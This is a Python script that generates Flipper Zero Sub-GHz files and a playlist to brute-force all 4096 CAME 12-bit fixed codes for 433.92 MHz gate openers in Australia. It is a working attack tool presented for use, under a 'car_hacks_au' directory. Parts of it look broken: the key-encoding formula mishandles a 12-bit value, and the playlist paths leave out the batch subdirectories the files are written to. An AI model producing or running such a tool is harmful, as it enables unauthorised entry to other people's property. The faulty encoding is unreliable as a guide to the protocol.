#!/usr/bin/env python3
"""
CAME 12-bit Brute Force Generator for Australian 433.92 MHz Gates
Flipper Zero Sub-GHz Playlist Compatible

Generates individual .sub files for each CAME 12-bit code (0x000-0xFFF)
and a playlist file to cycle through them on the Flipper.

CAME protocol: 12-bit fixed code, TE ~325us, OOK modulation
Total code space: 4096 codes (2^12)

Usage:
    python came_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/came_bf/
    python came_bruteforce_gen.py --output-dir ../../car_hacks_au/gates/came_bf/ --range 0x000 0x1FF
    python came_bruteforce_gen.py --playlist-only --output-dir ../../car_hacks_au/gates/came_bf/
"""

import argparse
import os
from pathlib import Path


CAME_BIT = 12
CAME_TE = 325
CAME_FREQ = 433920000
CAME_PRESET = "FuriHalSubGhzPresetOok650Async"


def int_to_came_key(code: int) -> str:
    """Convert a 12-bit CAME code to 8-byte hex key format."""
    if code < 0 or code > 0xFFF:
        raise ValueError(f"CAME code must be 0x000-0xFFF, got 0x{code:03X}")
    # CAME 12-bit: code in last 2 bytes, upper bytes zero
    return f"00 00 00 00 00 00 {code:02X} {(code << 4) & 0xFF | ((code >> 4) & 0x0F):02X}"


def generate_came_sub(code: int, output_path: Path):
    """Generate a single CAME .sub Key File."""
    key_hex = int_to_came_key(code)
    content = f"""Filetype: Flipper SubGhz Key File
Version: 1
Frequency: {CAME_FREQ}
Preset: {CAME_PRESET}
Protocol: CAME
Bit: {CAME_BIT}
Key: {key_hex}
TE: {CAME_TE}
"""
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(content, encoding="utf-8")


def generate_playlist(output_dir: Path, start: int, end: int):
    """Generate a playlist .txt pointing to all generated .sub files."""
    playlist_path = output_dir / "came_bruteforce_playlist.txt"
    lines = [
        "# CAME 12-bit Brute Force Playlist",
        f"# Code range: 0x{start:03X} - 0x{end:03X}",
        f"# Total files: {end - start + 1}",
        f"# Frequency: {CAME_FREQ} (433.92 MHz AU)",
        f"# Protocol: CAME, Bit: {CAME_BIT}, TE: {CAME_TE}",
        "#",
    ]
    for code in range(start, end + 1):
        sd_path = f"/ext/subghz/car_hacks_au/gates/came_bf/came_{code:03X}.sub"
        lines.append(sd_path)

    playlist_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[+] Playlist -> {playlist_path}")


def main():
    parser = argparse.ArgumentParser(
        description="CAME 12-bit Brute Force Generator for AU 433.92 MHz"
    )
    parser.add_argument(
        "--output-dir", type=str, default="came_bf",
        help="Output directory for generated .sub files"
    )
    parser.add_argument(
        "--range", nargs=2, type=lambda x: int(x, 0), default=[0x000, 0xFFF],
        metavar=("START", "END"),
        help="Code range in hex (default: 0x000 0xFFF for full 4096)"
    )
    parser.add_argument(
        "--playlist-only", action="store_true",
        help="Only generate playlist, skip .sub file generation"
    )
    parser.add_argument(
        "--batch-size", type=int, default=256,
        help="Files per subdirectory (default: 256)"
    )

    args = parser.parse_args()
    output_dir = Path(args.output_dir)
    start, end = args.range

    if not args.playlist_only:
        total = end - start + 1
        print(f"[*] Generating {total} CAME .sub files (0x{start:03X} - 0x{end:03X})...")
        print(f"[*] Output: {output_dir.resolve()}")

        for code in range(start, end + 1):
            # Batch into subdirectories of batch_size
            batch = code // args.batch_size
            batch_dir = output_dir / f"batch_{batch:02X}"
            filename = f"came_{code:03X}.sub"
            generate_came_sub(code, batch_dir / filename)

            if (code - start + 1) % 500 == 0:
                print(f"  ... {code - start + 1}/{total} files generated")

        print(f"[+] Generated {total} .sub files")

    generate_playlist(output_dir, start, end)


if __name__ == "__main__":
    main()
